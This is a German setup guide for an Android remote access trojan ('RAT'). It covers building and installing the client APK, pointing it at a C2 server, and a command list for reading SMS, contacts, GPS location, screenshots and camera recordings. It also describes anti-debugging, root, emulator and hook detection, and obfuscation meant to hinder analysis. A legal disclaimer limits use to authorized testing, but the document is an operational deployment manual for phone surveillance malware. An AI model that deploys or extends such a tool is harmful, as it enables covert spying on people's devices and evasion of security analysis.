# 🔐 Sicherer Android RAT - Setup-Anleitung v2.0

## ⚠️ WICHTIGER RECHTLICHER HINWEIS
Diese Software ist ausschließlich für:
- Autorisierte Penetrationstests
- Sicherheitsforschung in kontrollierten Umgebungen  
- Überwachung eigener Geräte mit expliziter Einwilligung

**Jede unbefugte Nutzung ist illegal und strafbar!**

## 🚀 Schnellstart

### 1. Server-Setup (Python)

```bash
# 1. Abhängigkeiten installieren
pip install -r requirements.txt

# 2. SSL-Zertifikate (werden automatisch generiert)
python server.py  # Erstellt server.crt und server.key

# 3. Server starten
python server.py
```

Der Server läuft auf `https://0.0.0.0:8443` mit automatischer SSL-Verschlüsselung.

### 2. Android Client-Setup

```bash
# 1. In Android Studio öffnen
cd client/

# 2. Konfiguration anpassen
# - Bearbeiten Sie SecureConfig.java für Ihre Server-IP
# - SSL-Zertifikat-Validierung anpassen falls nötig

# 3. App kompilieren
./gradlew assembleRelease

# 4. APK installieren (nur auf autorisierten Geräten!)
adb install app/build/outputs/apk/release/app-release.apk
```

## 🔧 Erweiterte Konfiguration

### Server-Konfiguration

```python
# In server.py anpassen:
HOST = '0.0.0.0'          # Server-IP
PORT = 8443               # HTTPS-Port
SSL_CERT_FILE = 'server.crt'
SSL_KEY_FILE = 'server.key'
```

### Client-Konfiguration

```java
// In SecureConfig.java:
private static final String DEFAULT_C2_HOST = "IHR_SERVER_IP";
private static final int DEFAULT_C2_PORT = 8443;
```

## 🛡️ Sicherheitsfeatures

### ✅ Implementierte Sicherheitsmaßnahmen

1. **TLS 1.2+ Verschlüsselung** für alle Verbindungen
2. **Challenge-Response-Authentifizierung** mit HMAC-SHA256
3. **AES-256-GCM Ende-zu-Ende-Verschlüsselung** aller Nachrichten
4. **Umfassende Integritätsprüfungen**:
   - App-Signatur-Validierung
   - Root-/Emulator-/Hook-Erkennung
   - Anti-Debugging-Maßnahmen
5. **Verschlüsselte Konfigurationsspeicherung** (EncryptedSharedPreferences)
6. **Rate Limiting** (max. 30 Commands/Minute)
7. **Command-Whitelisting** und Benutzereinwilligung
8. **Erweiterte ProGuard-Obfuskierung**
9. **Minimierte Android-Berechtigungen**
10. **Automatische Session-Bereinigung**

### 🔐 Authentifizierungsablauf

```
1. Client → Server: Authentifizierungsanfrage
2. Server → Client: Challenge (Zufallstoken)
3. Client → Server: HMAC-Response mit geteiltem Geheimnis
4. Server: Validierung → Authentifizierungstoken
5. Alle nachfolgenden Nachrichten: verschlüsselt + signiert
```

### 📊 Integritätsprüfungen

```java
SecurityCheckResult result = integrityValidator.performSecurityCheck();
// Prüft: Signatur, Debugging, Emulator, Root, Hooks, Xposed
```

## 🎯 Verfügbare Befehle

### Grundlegende Befehle
- `get-device-info` - Geräteinformationen
- `get-location` - GPS-Position (erfordert Berechtigung)
- `get-wifi` - WiFi-Informationen  
- `get-battery` - Akkustatus
- `get-network-info` - Netzwerkinformationen
- `get-storage-info` - Speicherinformationen
- `ls [pfad]` - Dateien auflisten
- `get-apps` - Installierte Apps
- `vibrate` - Gerät vibrieren lassen

### Erweiterte Befehle (erfordern zusätzliche Berechtigungen)
- `screenshot` - Bildschirmfoto (MediaProjection erforderlich)
- `get-sms` - SMS lesen (READ_SMS)
- `get-contacts` - Kontakte abrufen (READ_CONTACTS)
- `start-camera` - Kamera-Aufzeichnung (CAMERA)

## 🔒 Sicherheitsempfehlungen

### Produktions-Deployment

1. **Echte SSL-Zertifikate verwenden**:
```bash
# Erstellen Sie ein CA-signiertes Zertifikat
openssl req -newkey rsa:4096 -nodes -keyout server.key \
    -out server.csr -config <(cat server.conf)
# Lassen Sie server.csr von einer CA signieren
```

2. **Starke Authentifizierung**:
```python
# Ändern Sie das Master-Geheimnis
export RAT_MASTER_KEY="ihr_sicheres_256bit_geheimnis_hier"
```

3. **Netzwerksicherheit**:
   - VPN oder isoliertes Netzwerk verwenden
   - Firewall-Regeln konfigurieren
   - DDoS-Schutz implementieren

4. **Monitoring und Logging**:
```python
# Server erstellt automatisch c2_server.log
# Überwachen Sie verdächtige Aktivitäten
tail -f c2_server.log
```

### Android-App-Sicherheit

1. **App-Signatur**: Verwenden Sie einen sicheren Signing-Schlüssel
2. **ProGuard**: Release-Builds automatisch obfuskiert
3. **Berechtigungen**: Nur minimale Berechtigungen standardmäßig aktiviert
4. **Anti-Tampering**: Automatische Erkennung von Manipulationen

## 🚨 Fehlerbehebung

### Server startet nicht
```bash
# SSL-Zertifikat-Probleme
openssl verify server.crt
# Port bereits belegt
netstat -tulpn | grep 8443
```

### Client verbindet sich nicht
1. Firewall-Einstellungen prüfen
2. Server-IP in SecureConfig.java korrekt?
3. SSL-Zertifikat vertrauenswürdig?
4. Netzwerkverbindung verfügbar?

### Authentifizierung fehlgeschlagen
1. Zeitstempel-Synchronisation prüfen
2. Geteiltes Geheimnis korrekt konfiguriert?
3. Server-Logs auf Details prüfen

## 📋 Entwicklung & Testing

### Debug-Build erstellen
```bash
./gradlew assembleDebug
# WARNUNG: Debug-Builds werden von Integritätsprüfung abgelehnt!
```

### Server im Debug-Modus
```python
# Logging-Level erhöhen
logging.basicConfig(level=logging.DEBUG)
```

### Tests ausführen
```bash
# Python-Tests
pytest tests/

# Android-Tests
./gradlew test
```

## 📄 Lizenz & Haftung

Diese Software wird "AS IS" bereitgestellt ohne jegliche Gewährleistung.
Der Entwickler übernimmt keine Haftung für missbräuchliche Nutzung.

**Verwenden Sie diese Software nur legal und ethisch verantwortlich!**

---
**Version**: 2.0 | **Letzte Aktualisierung**: September 2024
